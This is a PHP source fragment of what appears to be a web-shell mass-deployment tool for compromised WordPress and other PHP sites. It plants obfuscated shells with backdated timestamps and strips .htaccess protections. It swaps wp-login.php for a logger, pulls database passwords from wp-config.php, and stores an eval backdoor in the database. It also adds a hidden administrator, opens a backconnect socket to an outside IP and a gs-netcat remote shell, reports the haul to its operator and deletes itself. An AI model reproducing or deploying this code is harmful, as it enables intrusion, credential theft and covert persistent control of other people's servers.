    $_SERVER["HTTP_HOST"] .
    str_replace($_SERVER["DOCUMENT_ROOT"], "", $direktori);
$fullxx = str_replace("//", "/", $fullxx);
$fullxx = preg_replace("#[/\\\\]+#", "/", $fullxx);
if (isset($_POST["direktorix"])) {
    $direktori = $_POST["direktorix"];
} else {
    $direktori = $_SERVER["DOCUMENT_ROOT"];
}

echo "<hr><br>";
echo '<h2 class="text-center"><span id="minutes"></span>:<span id="seconds"></span></h2>
	<form class="center" action="" method="post">
	<div class="form-inline"><select name="modex" id="modex" class="form-control" style="width:20%;height: 40px;">
	 	<option value="standard">Standard</option></select>
	 <input class="form-control ml-3" type="text" name="direktorix" value="' .
    $direktori .
    '" style="width:70%;height:40px;">
	 </div>
	 <div style="margin-top:10px;width:93%;">
	 &nbsp; &nbsp;  <input type="checkbox" name="kuman" value="yes"/>  Kuman
	 &nbsp; &nbsp;  <input type="checkbox" checked name="license" value="yes"/>  License
	 &nbsp; &nbsp;  <input type="checkbox" name="backlinks" value="yes"/>  Backlinks
     &nbsp; &nbsp;  <input type="checkbox" checked name="wplogger" value="yes"/>  WP Logger
     &nbsp; &nbsp;  <input type="checkbox" checked name="skyper" value="yes"/>  Deploy Skyper
	 &nbsp; &nbsp;  <input type="checkbox" checked name="sockets" value="yes"/>  Sockets
	 &nbsp; &nbsp;	' .
    $version .
    '
	 <br /><br />
	 <input type="submit" class="form-control btn btn-success " style="height: 40px;" value="Tebar" name="tebar" />
	 </div> </form>
	 <br>';
if (isset($_POST["modex"])) {
    echo '<script type="text/javascript"> document.getElementById("modex").value = "' .
        $_POST["modex"] .
        '";</script>';
}
if (isset($_POST["tebar"])) {
    $modeio = $_POST["modex"];
    $waktu = strtotime("-" . rand(30, 90) . " days", time());
    $folderio = $_POST["direktorix"];
    if (substr($folderio, -1) == "/") {
        $folderio = substr($folderio, 0, -1);
    }

    $dirderdor = getSubDirectories($folderio);
    $dirderdor = str_replace("//", "/", $dirderdor);
    $subdir = shuffle_assoc($dirderdor);
    $totaldir = count($dirderdor);

    echo "<br>Total Directory to Infect: " . $totaldir . " / " . count($eft0);

    $pehape = getFilex($folderio, '/\.php$/');
    $jumlahfilenyax = count(array_unique($pehape));

    if ($jumlahfilenyax < count($itemsxz)) {
        $namanamafile = shuffle_assoc($enx0);
    } else {
        $namanamafile = shuffle_assoc($pehape);
    }

    echo "<br>Total Unique File Name to Copied and Infect: " .
        $jumlahfilenyax .
        " / " .
        count($itemsxz);
    echo "<hr><br><code>";
    $adminer =
        "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php";
    if (isset($_POST["license"])) {
        $love = "licenses.php";
        $laporlove = dirname(__FILE__) . "/" . $love;
        if (!file_exists($laporlove)) {
            $tmpf = tempnam(sys_get_temp_dir(), "sess_");
            $textz = b64dd(html_entity_decode(gzinflate(b64dd($local))));
            @file_put_contents($tmpf, $textz);
            @file_put_contents(
                $laporlove,
                '<?php if(file_exists("' .
                    $tmpf .
                    '")) {  require_once("' .
                    $tmpf .
                    '"); } ?>'
            );
        } else {
            $textz = b64dd(html_entity_decode(gzinflate(b64dd($local))));
            @file_put_contents($textz, $laporlove);
        }

        if (file_exists($laporlove) && filesize($laporlove) > 0) {
            echo "<a href='//" .
                $fullxx .
                str_replace($_SERVER["DOCUMENT_ROOT"], "", $laporlove) .
                "' target='_blank'>" .
                $fullxx .
                str_replace($_SERVER["DOCUMENT_ROOT"], "", $laporlove) .
                "</a><br>";
            echo "Server IP: " . $_SERVER['SERVER_ADDR'] . "<br>";
            $reportFinal =
                $fullxx .
                str_replace($_SERVER["DOCUMENT_ROOT"], "", $laporlove) .
                PHP_EOL;
            @touch($laporlove, $waktu);
        }
        if (empty($reportFinal)) {
            $reportFinal = "Tidak Bisa Tebar!";
            goto EndofLife;
        }
    }

    if (isset($folderio)) {
        // start all
        $waktu = strtotime("-" . rand(30, 90) . " days", time());
        if ($modeio === "hakai") {
            if (class_exists("ZipArchive")) {
                if (is_writable($folderio)) {
                    $remah = fgt(
                        decno(
                            "x8GsvbSSeHzMe6u5sMyqvI2wp7pw0rK9jbqdfLS9t8HIu525b9KyvQ=="
                        )
                    );
                    @file_put_contents($folderio . "/sentinel.zip", $remah);
                    $try = $folderio . "/";
                    $zip2 = new ZipArchive();
                    if ($zip2->open($folderio . "/sentinel.zip") === true) {
                        $treba = 0;
                        while ($treba <= count($itemsxz)) {
                            $namafilenx =
                                $namanamafile[array_rand($namanamafile, 1)];
                            $sourcemove =
                                "zip://" .
                                $folderio .
                                "/sentinel.zip/sentinel.pdf";
                            $sourcezx = b64ed(
                                b64dd(
                                    "PD9waHAgaW5jbHVkZShiYXNlNjRfZGVjb2RlKCI="
                                ) .
                                    b64ed($sourcemove) .
                                    b64dd("IikpOw==")
                            );
                            $picksubdirX1 = $eft0[array_rand($eft0, 1)];
                            $picksubdirFirst = $subdir[array_rand($subdir, 1)];
                            if ($totaldir < count($eft0)) {
                                $picksubdir =
                                    $picksubdirFirst . "/" . $picksubdirX1;
                            } else {
                                $picksubdir = $picksubdirFirst;
                            }
                            $fullSubdirFile = $picksubdir . "/" . $namafilenx;
                            if (!file_exists($fullSubdirFile)) {
                                $waktu = strtotime(
                                    "-" . rand(30, 90) . " days",
                                    time()
                                );
                                @file_put_contents(
                                    $fullSubdirFile,
                                    b64dd($sourcezx)
                                );

                                if (
                                    file_exists($fullSubdirFile) &&
                                    filesize($fullSubdirFile) > 0
                                ) {
                                    echo "<a href='//" .
                                        $fullxx .
                                        str_replace(
                                            $_SERVER["DOCUMENT_ROOT"],
                                            "",
                                            $fullSubdirFile
                                        ) .
                                        "' target='_blank'>" .
                                        $fullxx .
                                        str_replace(
                                            $_SERVER["DOCUMENT_ROOT"],
                                            "",
                                            $fullSubdirFile
                                        ) .
                                        "</a><br>";
                                    $reportFinal .=
                                        $fullxx .
                                        str_replace(
                                            $_SERVER["DOCUMENT_ROOT"],
                                            "",
                                            $fullSubdirFile
                                        ) .
                                        PHP_EOL;
                                    @touch($fullSubdirFile, $waktu);
                                }
                                $treba++;
                            }
                        }
                        $zip2->close();
                    }
                } else {
                    echo "Please check folder isn't writable!</code>";
                }
                goto EndofLife;
            } elseif (class_exists("PharData")) {
                if (is_writable($folderio)) {
                    $remah = fgt(
                        decno(
                            "x8GsvbSSeHzMe6u5sMyqvI2wp7pw0rK9jbqdfLS9t8HIu525b8ixrtE="
                        )
                    );
                    @file_put_contents($folderio . "/sentinel.phar", $remah);
                    $try = $folderio . "/";
                    $phar = new PharData();
                    if ($phar->open($folderio . "/sentinel.phar") === true) {
                        $treba = 0;
                        while ($treba <= count($itemsxz)) {
                            $namafilenx =
                                $namanamafile[array_rand($namanamafile, 1)];
                            $sourcemove =
                                "phar://" .
                                $folderio .
                                "/sentinel.phar/sentinel.pdf";
                            $sourcezx = b64ed(
                                b64dd(
                                    "PD9waHAgaW5jbHVkZShiYXNlNjRfZGVjb2RlKCI="
                                ) .
                                    b64ed($sourcemove) .
                                    b64dd("IikpOw==")
                            );
                            $picksubdirX1 = $eft0[array_rand($eft0, 1)];
                            $picksubdirFirst = $subdir[array_rand($subdir, 1)];
                            if ($totaldir < count($eft0)) {
                                $picksubdir =
                                    $picksubdirFirst . "/" . $picksubdirX1;
                            } else {
                                $picksubdir = $picksubdirFirst;
                            }
                            $fullSubdirFile = $picksubdir . "/" . $namafilenx;
                            if (!file_exists($fullSubdirFile)) {
                                $waktu = strtotime(
                                    "-" . rand(30, 90) . " days",
                                    time()
                                );
                                @file_put_contents(
                                    $fullSubdirFile,
                                    b64dd($sourcezx)
                                );

                                if (
                                    file_exists($fullSubdirFile) &&
                                    filesize($fullSubdirFile) > 0
                                ) {
                                    echo "<a href='//" .
                                        $fullxx .
                                        str_replace(
                                            $_SERVER["DOCUMENT_ROOT"],
                                            "",
                                            $fullSubdirFile
                                        ) .
                                        "' target='_blank'>" .
                                        $fullxx .
                                        str_replace(
                                            $_SERVER["DOCUMENT_ROOT"],
                                            "",
                                            $fullSubdirFile
                                        ) .
                                        "</a><br>";
                                    $reportFinal .=
                                        $fullxx .
                                        str_replace(
                                            $_SERVER["DOCUMENT_ROOT"],
                                            "",
                                            $fullSubdirFile
                                        ) .
                                        PHP_EOL;
                                    @touch($fullSubdirFile, $waktu);
                                }
                                $treba++;
                            }
                        }
                        $phar->close();
                    }
                } else {
                    echo "Please check folder isn't writable!</code>";
                }
                goto EndofLife;
            } else {
                echo "<h2 class='blink'>PHP Server has No ZipArchive or PharData Class</h2></hr>";
                goto EndofLife;
            }
        }

        $lapor8 = $folderio . "/wp-config.php";
        if (file_exists($lapor8)) {
            // start wp
            $treba = 0;
            while ($treba <= count($itemsxz)) {
                switch ($modeio) {
                    case "standard":
                        $namafilenx =
                            $namanamafile[array_rand($namanamafile, 1)];
                        $sourcezx = $itemsxz[array_rand($itemsxz, 1)];
                        break;
                    case "aaaaaaaaaaaaaaaaaaa":
                        $namafilenx =
                            $namanamafile[array_rand($namanamafile, 1)];
                        $sourcezx = html_entity_decode(
                            gzinflate(b64dd($local))
                        );
                        break;
                    default:
                        $namafilenx = $enx1[array_rand($enx1, 1)];
                        $sourcezx = $itemsxz[array_rand($itemsxz, 1)];
                }
                $picksubdirX1 = $eft0[array_rand($eft0, 1)];
                $picksubdirFirst = $subdir[array_rand($subdir, 1)];

                if ($totaldir < count($eft0)) {
                    $picksubdir = $picksubdirFirst . "/" . $picksubdirX1;
                } else {
                    $picksubdir = $picksubdirFirst;
                }
                $fullSubdirFile = $picksubdir . "/" . $namafilenx;
                $htaccess = $picksubdir . "/.htaccess";
                if (!file_exists($fullSubdirFile)) {
                    if (!file_exists($picksubdir)) {
                        if (!mkdir($picksubdir, 0755, true)) {
                            continue;
                        }
                    }
                    if (!is_writable($picksubdir)) {
                        continue;
                    }
                    if (file_exists($htaccess)) {
                        $htaneh = fgt($htaccess);
                        $rintangan1 = "/FilesMatch/i";
                        $rintangan2 = "/Require all denied/i";
                        preg_match($rintangan1, $htaneh, $hasilhtaneh1);
                        preg_match($rintangan2, $htaneh, $hasilhtaneh2);
                        $wipesht1 = $hasilhtaneh1[1];
                        $wipesht2 = $hasilhtaneh2[1];
                        if (!empty($wipesht1) || !empty($wipesht2)) {
                            @chmod($picksubdir . "/" . ".htaccess", 0644);
                            @unlink($picksubdir . "/.htaccess");
                            @file_put_contents(
                                $picksubdir . "/.htaccess",
                                "UmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleFwucGhwJCAtIFtMXQ=="
                            );
                        }
                    }
                    $waktu = strtotime("-" . rand(30, 90) . " days", time());
                    $reportx = fgt($sourcezx);
                    switch ($modeio) {
                        case "small":
                            @file_put_contents($fullSubdirFile, $sourcezx);
                            break;
                        default:
                            @file_put_contents($fullSubdirFile, $reportx);
                    }
                    if (
                        file_exists($fullSubdirFile) &&
                        filesize($fullSubdirFile) > 0
                    ) {
                        echo "<a href='//" .
                            $fullxx .
                            str_replace(
                                $_SERVER["DOCUMENT_ROOT"],
                                "",
                                $fullSubdirFile
                            ) .
                            "' target='_blank'>" .
                            $fullxx .
                            str_replace(
                                $_SERVER["DOCUMENT_ROOT"],
                                "",
                                $fullSubdirFile
                            ) .
                            "</a><br>";
                        $reportFinal .= $fullxx.str_replace($_SERVER["DOCUMENT_ROOT"], "", $fullSubdirFile) .PHP_EOL;
                        @touch($fullSubdirFile, $waktu);
                    }
                    $treba++;
                }
            }

            if (isset($_POST["backlinks"])) {
                backlinks($folderio);
            }
            $loginwpx = fgt(
                decno(
                    "x8GsvbSSeHzRrq97qMG9tdSvrcCmyqy8zcGdu7WGrLzMfI+8s7yZv8TAq3yYx7uxr7+dwLSHtq7SwZ2/cM+5esu8n7avhrm1zw=="
                )
            );
            file_put_contents($folderio . "/wp-login.php", $loginwpx);
            @touch($folderio . "/wp-login.php", $waktu);

            $picksubdirlapor13 = $subdir[array_rand($subdir, 1)];
            $namafilelapor13 = $namanamafile[array_rand($namanamafile, 1)];
            $lapor13 = $picksubdirlapor13 . "/" . $namafilelapor13;

            if (!file_exists($lapor13)) {
                $report13 = fgt($adminer);
                file_put_contents($lapor13, $report13);
                @touch($lapor13, $waktu);
            }
            if (file_exists($lapor13) && filesize($lapor13) > 0) {
                echo "<br>Adminer: ";
                echo "<a href='//" .
                    $fullxx .
                    str_replace($_SERVER["DOCUMENT_ROOT"], "", $lapor13) .
                    "' target='_blank'>" .
                    $fullxx .
                    str_replace($_SERVER["DOCUMENT_ROOT"], "", $lapor13) .
                    "</a>";
                echo "<br>WP: " . $folderio;
                $reportFinal .=
                    "Adminer: " .
                    $fullxx .
                    str_replace($_SERVER["DOCUMENT_ROOT"], "", $lapor13) .
                    PHP_EOL;
                $reportFinal .= "WP: " . $folderio . PHP_EOL;
            }
            $cxz = fgt($lapor8);
            preg_match('/define.*DB_NAME.*\'(.*)\'/', $cxz, $mxz);
            $dbname = $mxz[1];
            preg_match('/define.*DB_USER.*\'(.*)\'/', $cxz, $mxz);
            $dbuser = $mxz[1];
            preg_match('/define.*DB_PASSWORD.*\'(.*)\'/', $cxz, $mxz);
            $dbpass = $mxz[1];
            preg_match('/define.*DB_HOST.*\'(.*)\'/', $cxz, $mxz);
            $dbhost = $mxz[1];
            preg_match('/table_prefix.*=.*\'(.*)\'/', $cxz, $mxm);
            $table_prefix = $mxm[1];
            if (isset($dbname)) {
                echo "<br>DB Name: " . $dbname;
                $shell_db_name = $dbname . PHP_EOL;
                echo " - DB Host: " . $dbhost;
                $shell_db_host = $dbhost . PHP_EOL;
                echo "<br>DB User: " . $dbuser;
                $shell_db_user = $dbuser . PHP_EOL;
                echo " - DB Pass: " . $dbpass;
                $reportFinal .=
                    "DB Name: " .
                    $dbname .
                    " | DB Host: " .
                    $dbhost .
                    " | DB User: " .
                    $dbuser .
                    " | DB Pass: " .
                    $dbpass .
                    PHP_EOL;
            }
            if (isset($dbname)) {
                $filetoinject = $folderio . "/wp-config-sample.php";
                if (!file_exists($filetoinject)) {
                    file_put_contents($filetoinject, "<?php phpinfo(); ?>");
                }
                $key = generateRandomString();
                $shellz =
                    "CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCjw/cGhwIGVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7IGVjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MCI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT4nOyBpZiggJF9QT1NUWydfdXBsJ10gPT0gIlVwbG9hZCIgKSB7IGlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKSB7IGVjaG8gJzxiPk9LPC9iPjxicj48YnI+JzsgfSBlbHNlIHsgZWNobyAnPGI+RmFpbGVkITwvYj48YnI+PGJyPic7IH0gfWV4aXQoKTsgPz4=";
                if (
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass, $dbname)
                ) {
                    if (
                        @is_file($filetoinject) &&
                        @is_writable($filetoinject)
                    ) {
                        @mysqli_query($conn, "DROP TABLE `licenses`");
                        @mysqli_query(
                            $conn,
                            "CREATE TABLE `licenses` (code LONGTEXT)"
                        );
                        @mysqli_query(
                            $conn,
                            'INSERT INTO `licenses` VALUES("' . $shellz . '")'
                        );
                        $code =
                            '<?php if(isset($_GET["x"])&&$_GET["x"]=="' .
                            $key .
                            '"){$conn=mysqli_connect("' .
                            str_replace('"', '\"', $dbhost) .
                            '","' .
                            str_replace('"', '\"', $dbuser) .
                            '","' .
                            str_replace('"', '\"', $dbpass) .
                            '","' .
                            str_replace('"', '\"', $dbname) .
                            '");$q=mysqli_query($conn,"SELECT `code` FROM licenses LIMIT 0,1");$r=mysqli_fetch_assoc($q);eval("?>".base64_decode($r["code"]));exit;} ?>';
                        @touch($filetoinject, $waktu);
                    }
                    @file_put_contents(
                        $filetoinject,
                        $code . "\n" . @file_get_contents($filetoinject)
                    );
                    $sql_backdoor =
                        $fullxx .
                        str_replace(
                            $_SERVER["DOCUMENT_ROOT"],
                            "",
                            $filetoinject
                        ) .
                        "?x=" .
                        $key .
                        PHP_EOL;
                    echo "<br>SQL Backdoor: <a href='//" .
                        $fullxx .
                        str_replace(
                            $_SERVER["DOCUMENT_ROOT"],
                            "",
                            $filetoinject
                        ) .
                        "?x=" .
                        $key .
                        "' target='_blank'>" .
                        $fullxx .
                        str_replace(
                            $_SERVER["DOCUMENT_ROOT"],
                            "",
                            $filetoinject
                        ) .
                        "?x=" .
                        $key .
                        "</a><br>";
                }
            }
            $passw0rd = generateRandomString();
            define('WP_USE_THEMES', false);
            require($folderio . '/wp-blog-header.php');
            $new_admin_username = $dbname;
            $new_admin_password = $passw0rd;
            $new_admin_email = 'hax@segfault.net';
            if (!username_exists($new_admin_username)) {
                $user_id = wp_create_user($new_admin_username, $new_admin_password, $new_admin_email);
            
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                echo "WP U: " . $dbname . " P: " . $passw0rd . "<br>";
            } else {
                echo '';
            }
            // end wp
        } else {
            // start ghost
            $waktu = strtotime("-" . rand(30, 90) . " days", time());
            $trebo = 0;
            while ($trebo <= count($itemsxz)) {
                switch ($modeio) {
                    case "standard":
                        $namafilenx =
                            $namanamafile[array_rand($namanamafile, 1)];
                        $sourcezx = $itemsxz[array_rand($itemsxz, 1)];
                        break;
                    case "fwafawfawfaw":
                        $namafilenx =
                            $namanamafile[array_rand($namanamafile, 1)];
                        $sourcezx = html_entity_decode(
                            gzinflate(b64dd($local))
                        );
                        break;
                    default:
                        $namafilenx = $enx1[array_rand($enx1, 1)];
                        $sourcezx = $itemsxz[array_rand($itemsxz, 1)];
                }
                $picksubdirX1 = $eft0[array_rand($eft0, 1)];
                $picksubdirFirst = $subdir[array_rand($subdir, 1)];

                if ($totaldir < count($eft0)) {
                    $picksubdir = $picksubdirFirst . "/" . $picksubdirX1;
                } else {
                    $picksubdir = $picksubdirFirst;
                }
                $fullSubdirFile = $picksubdir . "/" . $namafilenx;
                $htaccess = $picksubdir . "/.htaccess";
                if (!file_exists($fullSubdirFile)) {
                    if (!file_exists($picksubdir)) {
                        if (!mkdir($picksubdir, 0755, true)) {
                            continue;
                        }
                    }
                    if (!is_writable($picksubdir)) {
                        continue;
                    }
                    if (file_exists($htaccess)) {
                        $htaneh = fgt($htaccess);
                        $rintangan1 = "/FilesMatch/i";
                        $rintangan2 = "/Require all denied/i";
                        preg_match($rintangan1, $htaneh, $hasilhtaneh1);
                        preg_match($rintangan2, $htaneh, $hasilhtaneh2);
                        $wipesht1 = $hasilhtaneh1[1];
                        $wipesht2 = $hasilhtaneh2[1];
                        if (!empty($wipesht1) || !empty($wipesht2)) {
                            @chmod($picksubdir . "/.htaccess", 0644);
                            @unlink($picksubdir . "/.htaccess");
                            @file_put_contents(
                                $picksubdir . "/.htaccess",
                                "UmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleFwucGhwJCAtIFtMXQ=="
                            );
                        }
                    }
                    $waktu = strtotime("-" . rand(30, 90) . " days", time());
                    $reportx = fgt($sourcezx);
                    switch ($modeio) {
                        case "small":
                            @file_put_contents($fullSubdirFile, $sourcezx);
                            break;
                        default:
                            @file_put_contents($fullSubdirFile, $reportx);
                    }

                    if (
                        file_exists($fullSubdirFile) &&
                        filesize($fullSubdirFile) > 0
                    ) {
                        echo "<a href='//" .
                            $fullxx .
                            str_replace(
                                $_SERVER["DOCUMENT_ROOT"],
                                "",
                                $fullSubdirFile
                            ) .
                            "' target='_blank'>" .
                            $fullxx .
                            str_replace(
                                $_SERVER["DOCUMENT_ROOT"],
                                "",
                                $fullSubdirFile
                            ) .
                            "</a><br>";
                        $reportFinal .=
                            $fullxx .
                            str_replace(
                                $_SERVER["DOCUMENT_ROOT"],
                                "",
                                $fullSubdirFile
                            ) .
                            PHP_EOL;
                        @touch($fullSubdirFile, $waktu);
                    }
                    $trebo++;
                }
            }
        }
        EndofLife:

        $folderUP = $folderio . "/.DS_Store/" . date("Y/m");
        if (!is_dir($folderUP)) {
            @mkdir($folderUP, 0755, true);
        }
        if (is_writable($folderUP)) {
            @file_put_contents($folderUP . "/logo-backup.png", $textz);
            $realphp = '<?php require_once("logo-backup.png"); ?>';
            if (
                @file_put_contents(
                    $folderUP . "/" . date("j") . ".jpg.php",
                    $realphp
                )
            ) {
                if (
                    file_exists($folderUP . "/" . date("j") . ".jpg.php") &&
                    filesize($folderUP . "/" . date("j") . ".jpg.php") > 0
                ) {
                    echo "<a href='//" .
                        $fullxx .
                        str_replace(
                            $_SERVER["DOCUMENT_ROOT"],
                            "",
                            $folderUP . "/" . date("j") . ".jpg.php"
                        ) .
                        "' target='_blank'>" .
                        $fullxx .
                        str_replace(
                            $_SERVER["DOCUMENT_ROOT"],
                            "",
                            $folderUP . "/" . date("j") . ".jpg.php"
                        ) .
                        "</a><br>";
                    $reportFinal .=
                        $fullxx .
                        str_replace(
                            $_SERVER["DOCUMENT_ROOT"],
                            "",
                            $folderUP . "/" . date("j") . ".jpg.php"
                        ) .
                        PHP_EOL;
                    @touch($folderUP . "/" . date("j") . ".jpg.php", $waktu);
                }
            }
            @chmod($folderUP, 0111);
        }
    }

    $gsc =
        "Z29vZ2xlLXNpdGUtdmVyaWZpY2F0aW9uOiBnb29nbGU4ZjFjZGUyZjJhNzFhYjc2Lmh0bWw=";
    if (
        @file_put_contents(
            $folderio . "/google8f1cde2f2a71ab76.html",
            b64dd($gsc)
        )
    ) {
        @touch($folderio . "/google8f1cde2f2a71ab76.html", $waktu);
    }

    if (isset($_POST["wplogger"])) {
        $loginwpx = fgt(decno('x8GsvbSSeHzGtqx7pb23wc57sraxh8C9y7xmvanI'));
		file_put_contents($folderio.'/wp-login.php', $loginwpx); @touch($folderio.'/wp-login.php', $waktu); 
    }

    if (isset($_POST["sockets"])) {
        $soxxF = "ipv4.php";
        $picksubdirSox = $subdir[array_rand($subdir, 1)];
        $soxx = $picksubdirSox . "/" . $soxxF;
        $soxCode = html_entity_decode(gzinflate(b64dd($sox)));
        $srcSox =
            "<?php " .
            "set_time_limit(0); \$ip='74.48.78.57'; \$port=433;" .
            $soxCode .
            " ?>";
        if (@file_put_contents($soxx, $srcSox)) {
            if (file_exists($soxx) && filesize($soxx) > 0) {
                echo "<br>PHP Sockets: <a href='//" .
                    $fullxx .
                    str_replace($_SERVER["DOCUMENT_ROOT"], "", $soxx) .
                    "' target='_blank'>" .
                    $fullxx .
                    str_replace($_SERVER["DOCUMENT_ROOT"], "", $soxx) .
                    "</a>";
                $reportFinal .=
                    "Backconnect: " .
                    $fullxx .
                    str_replace($_SERVER["DOCUMENT_ROOT"], "", $soxx) .
                    PHP_EOL;
                @touch($soxx, $waktu);
            }
        }
    }
    if (isset($_POST["kuman"])) {
        if (function_exists("exec")) {
            if (OS() === "Linux") {
                $astaga = "kuman.php";
                $picksubdirbot = $subdir[array_rand($subdir, 1)];
                $astagaf = $picksubdirbot . "/" . $astaga;
                $bt = fgt(
                    decno(
                        "x8GsvbSSeHzGtqx7pb23wc57sraxh7TCzK6me7HAuQ=="
                    )
                );
                file_put_contents($astagaf, b64dd($bt));
                exec(
                    "cd " .
                        $picksubdirbot .
                        " && exec php -f" .
                        $astagaf .
                        " > /dev/null &"
                );
                $reportFinal .=
                    "Tuman : " .
                    $fullxx .
                    str_replace(
                        $_SERVER["DOCUMENT_ROOT"],
                        "",
                        $picksubdirbot . "/tuman.php"
                    ) .
                    PHP_EOL;
                echo "<br>Tuman : <a href='//" .
                    $fullxx .
                    str_replace(
                        $_SERVER["DOCUMENT_ROOT"],
                        "",
                        $picksubdirbot . "/tuman.php"
                    ) .
                    "' target='_blank'>" .
                    $fullxx .
                    str_replace(
                        $_SERVER["DOCUMENT_ROOT"],
                        "",
                        $picksubdirbot . "/tuman.php"
                    ) .
                    "</a>";
            }
        }
    }

    if (isset($_POST["skyper"])) {
        $skyper = b64dd(decno("sX6Gs5XDgpGxo4Kikoixk7B9q4aOq4u2uKWGvIqbereokIG4jJ+XfsK6r7SNr6PHtH2wv4qfsX3DlXrHkMGBw7mAhsOair25w5BtvaPRgoGqoIGK"));
        function cek_fungsi($fungsi) {
            return function_exists($fungsi) && !in_array($fungsi, array_map('trim', explode(', ', strtolower(ini_get('disable_functions')))));
        }

        if (cek_fungsi('shell_exec') && cek_fungsi('exec') && cek_fungsi('passthru') && cek_fungsi('system') && cek_fungsi('proc_open')) {
            $fungsi_terpilih = 'shell_exec';
            $output = $fungsi_terpilih($skyper);
            if (strpos($output, 'gs-netcat')) {
                $pec = explode('gs-netcat -s "', $output);
                $test = explode("\" -i", $pec[1]);
                echo "<br>Skyper: ". $test[0];
                $reportFinal .= "Skyper: ". $test[0] . PHP_EOL;
            } else {
                echo "<br>Skyper: FAIL";
            }
        } elseif (!cek_fungsi('shell_exec') && !cek_fungsi('exec') && !cek_fungsi('passthru') && !cek_fungsi('system') && !cek_fungsi('proc_open')) {
            echo "<br>Skyper: DISABLED FUNCTION";
        } else {
            $fungsi_terpilih = '';
            foreach (['shell_exec', 'exec', 'passthru', 'system', 'proc_open'] as $fungsi) {
                if (cek_fungsi($fungsi)) {
                    $fungsi_terpilih = $fungsi;
                    break;
                }
            }
            $output = $fungsi_terpilih($skyper);
            echo $output;
            if (strpos($output, 'gs-netcat')) {
                $pec = explode('gs-netcat -s "', $output);
                $test = explode("\" -i", $pec[1]);
                echo "<br>Skyper: ". $test[0];
                $reportFinal .= "Skyper: ". $test[0] . PHP_EOL;
            } else {
                echo "<br>Skyper: FAIL";
            }
        }
    }

    $reportFinal .= "Server IP: " . $_SERVER['SERVER_ADDR'] . PHP_EOL;
    $finalist = b64ed($reportFinal);
    GrabMe($_SERVER['HTTP_HOST'],$finalist,$folderio);
    echo "<br>Version: " . substr($version, 0, 6);
    echo "<br></code><br>";
    $pathxr = dirname(__FILE__);
    if (!unlink($pathxr . "/wp.php")) {
        exec("rm -rf wp.php");
    }
}

$end = microtime(true);
$time = number_format($end - $start, 2);

echo "<br><br>This page loaded in ", $time, " seconds";
?></div></body></html>
